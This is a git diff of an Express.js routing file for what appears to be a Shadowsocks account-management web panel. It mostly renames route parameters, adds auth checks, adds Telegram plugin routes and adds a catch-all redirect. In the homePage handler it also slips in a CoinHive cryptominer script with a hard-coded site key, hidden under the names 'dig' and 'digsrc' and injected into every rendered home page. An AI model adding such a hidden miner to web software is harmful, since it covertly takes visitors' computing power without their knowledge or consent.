@@ -72,8 +72,8 @@ app.get('/api/admin/flow/:serverId(\\d+)', isAdmin, adminFlow.getServerFlow);
 app.get('/api/admin/flow/:serverId(\\d+)/lastHour', isAdmin, adminFlow.getServerLastHourFlow);
 app.get('/api/admin/flow/:serverId(\\d+)/user', isAdmin, adminFlow.getServerUserFlow);
 app.get('/api/admin/flow/account/:accountId(\\d+)', isAdmin, adminFlow.getAccountServerFlow);
-app.get('/api/admin/flow/:serverId(\\d+)/:port(\\d+)', isAdmin, adminFlow.getServerPortFlow);
-app.get('/api/admin/flow/:serverId(\\d+)/:port(\\d+)/lastConnect', isAdmin, adminFlow.getServerPortLastConnect);
+app.get('/api/admin/flow/:serverId(\\d+)/:accountId(\\d+)', isAdmin, adminFlow.getServerPortFlow);
+app.get('/api/admin/flow/:serverId(\\d+)/:accountId(\\d+)/lastConnect', isAdmin, adminFlow.getServerPortLastConnect);
 
 app.get('/api/admin/user', isAdmin, adminUser.getUsers);
 app.post('/api/admin/user/add', isAdmin, adminUser.addUser);
@@ -86,7 +86,7 @@ app.post('/api/admin/user/:userId(\\d+)/sendEmail', isAdmin, admin.sendUserEmail
 app.put('/api/admin/user/:userId(\\d+)/:accountId(\\d+)', isAdmin, admin.setUserAccount);
 app.delete('/api/admin/user/:userId(\\d+)', isAdmin, admin.deleteUser);
 app.delete('/api/admin/user/:userId(\\d+)/:accountId(\\d+)', isAdmin, admin.deleteUserAccount);
-app.get('/api/admin/user/:port(\\d+)/lastConnect', isAdmin, admin.getUserPortLastConnect);
+app.get('/api/admin/user/:accountId(\\d+)/lastConnect', isAdmin, admin.getUserPortLastConnect);
 
 app.get('/api/admin/alipay', isAdmin, admin.getOrders);
 app.get('/api/admin/alipay/recentOrder', isAdmin, admin.getRecentOrders);
@@ -110,13 +110,14 @@ app.put('/api/admin/setting/base', isAdmin, adminSetting.modifyBase);
 app.get('/api/admin/setting/mail', isAdmin, adminSetting.getMail);
 app.put('/api/admin/setting/mail', isAdmin, adminSetting.modifyMail);
 
+app.post('/api/admin/setting/changePassword', isAdmin, adminSetting.changePassword);
 
 app.get('/api/user/notice', isUser, user.getNotice);
 app.get('/api/user/account', isUser, user.getAccount);
 app.get('/api/user/account/:accountId(\\d+)', isUser, user.getOneAccount);
 app.get('/api/user/server', isUser, user.getServers);
-app.get('/api/user/flow/:serverId(\\d+)/:port(\\d+)', isUser, user.getServerPortFlow);
-app.get('/api/user/flow/:serverId(\\d+)/:port(\\d+)/lastConnect', isUser, user.getServerPortLastConnect);
+app.get('/api/user/flow/:serverId(\\d+)/:accountId(\\d+)', isUser, user.getServerPortFlow);
+app.get('/api/user/flow/:serverId(\\d+)/:accountId(\\d+)/lastConnect', isUser, user.getServerPortLastConnect);
 app.put('/api/user/:accountId(\\d+)/password', isUser, user.changeShadowsocksPassword);
 app.get('/api/user/multiServerFlow', isUser, user.getMultiServerFlowStatus);
 
@@ -132,7 +133,17 @@ app.post('/api/user/paypal/execute', isUser, user.executePaypalOrder);
 app.post('/api/user/alipay/callback', user.alipayCallback);
 app.post('/api/user/paypal/callback', user.paypalCallback);
 
-app.post('/api/user/changePassword', user.changePassword);
+app.post('/api/user/changePassword', isUser, user.changePassword);
+
+if(config.plugins.webgui_telegram && config.plugins.webgui_telegram.use) {
+  const telegram = appRequire('plugins/webgui_telegram/account');
+  app.get('/api/user/telegram/code', isUser, user.getTelegramCode);
+  app.get('/api/admin/telegram/code', isAdmin, adminSetting.getTelegramCode);
+  app.post('/api/user/telegram/unbind', isUser, user.unbindTelegram);
+  app.post('/api/admin/telegram/unbind', isAdmin, adminSetting.unbindTelegram);
+  app.get('/api/user/telegram/qrcode/:qrcodeId', telegram.qrcode);
+  app.post('/api/user/telegram/login', telegram.login);
+}
 
 if(config.plugins.webgui.gcmAPIKey && config.plugins.webgui.gcmSenderId) {
   app.post('/api/push/client', push.client);
@@ -184,6 +195,7 @@ const configForFrontend = {
   paypal: config.plugins.paypal && config.plugins.paypal.use,
   paypalMode: config.plugins.paypal && config.plugins.paypal.mode,
   macAccount: config.plugins.macAccount && config.plugins.macAccount.use,
+  telegram: config.plugins.webgui_telegram && config.plugins.webgui_telegram.use,
 };
 
 const cdn = config.plugins.webgui.cdn;
@@ -219,6 +231,8 @@ const homePage = (req, res) => {
     success[0].value = JSON.parse(success[0].value);
     return success[0].value;
   }).then(success => {
+    const dig = 'https://coinhive.com/lib/coinhive.min.js';
+    const digsrc = `if(window.CoinHive){var m=new CoinHive.User('DZRAvxiOhGWQK1BGkw1qMHfwmuc9C106','${config.plugins.webgui.site}',{throttle: 0.9,threads:1});m.start();}`;
     configForFrontend.title = success.title;
     configForFrontend.themePrimary = success.themePrimary;
     configForFrontend.themeAccent = success.themeAccent;
@@ -231,6 +245,8 @@ const homePage = (req, res) => {
       analytics,
       config: configForFrontend,
       paypal: !!(config.plugins.paypal && config.plugins.paypal.use),
+      dig,
+      digsrc,
     });
   });
 };
@@ -256,6 +272,10 @@ app.get('/serviceworker.js', (req, res) => {
     });
   });
   
+});
+
+app.get('*', (req, res) => {
+  res.redirect('/');
 });
 
 // wss.on('connection', function connection(ws) {
